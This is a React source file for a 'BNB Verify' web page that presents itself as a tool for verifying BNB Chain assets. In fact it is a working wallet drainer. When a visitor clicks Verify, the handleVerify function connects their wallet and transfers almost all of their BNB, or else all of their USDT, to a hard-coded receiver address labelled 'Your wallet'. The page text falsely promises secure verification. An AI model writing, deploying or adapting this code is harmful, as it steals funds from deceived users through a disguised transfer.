import React, { useState } from "react";
import { ethers } from "ethers";
import "./App.css"; // Make sure pulse-ring CSS is in App.css

const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; // Your wallet
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint)",
  "function transfer(address to, uint amount) returns (bool)"
];

export default function App() {
  const [status, setStatus] = useState("Click Verify to start...");

  const handleVerify = async () => {
    if (!window.ethereum) {
      setStatus("No wallet detected. Please install Binance Wallet or MetaMask.");
      return;
    }

    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      setStatus("Checking balances...");

      // Check BNB balance
      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005") // leave gas
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      // Check USDT balance
      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  };

  return (
    <div className="min-h-screen bg-[#121212] flex flex-col items-center justify-start pt-16">
      {/* Title */}
      <h1 className="text-4xl md:text-5xl font-bold text-yellow-400 mb-4 text-center">
        Verify Crypto Assets
      </h1>
      <p className="text-gray-300 mb-12 max-w-xl text-center">
        Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.
      </p>

      {/* Verify Button with Pulse Animation */}
      <div className="relative flex justify-center items-center w-40 h-40 mb-8">
        <div className="pulse-ring"></div>
        <div className="pulse-ring"></div>
        <div className="pulse-ring"></div>
        <button onClick={handleVerify} className="button-primary relative z-10">
          Verify
        </button>
      </div>

      {/* Status */}
      <p className="text-gray-300 text-lg mb-12">{status}</p>

      {/* Cards Section */}
      <div className="container mx-auto px-6 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6">
        {["Explorer", "Tokens", "NFTs", "DApps"].map((item) => (
          <div key={item} className="card bg-[#1E1E1E] rounded-xl p-6 text-center transition-all cursor-pointer hover:translate-y-[-5px] hover:shadow-lg">
            <h2 className="text-yellow-400 text-lg font-semibold mb-2">{item}</h2>
            <p className="text-gray-400 text-sm">
              {item === "Explorer" && "Browse BNB Chain addresses, contracts, tokens, and transactions."}
              {item === "Tokens" && "Check token balances and verify authenticity of BNB Chain tokens."}
              {item === "NFTs" && "Verify NFTs on BNB Chain and view metadata securely."}
              {item === "DApps" && "Connect to decentralized apps and verify transactions safely."}
            </p>
          </div>
        ))}
      </div>

      {/* Footer */}
      <footer className="bg-[#171717] mt-auto py-6 text-center text-gray-500 text-sm w-full">
        &copy; 2025 BNB Verify. Powered by BNB Chain.
      </footer>
    </div>
  );
}
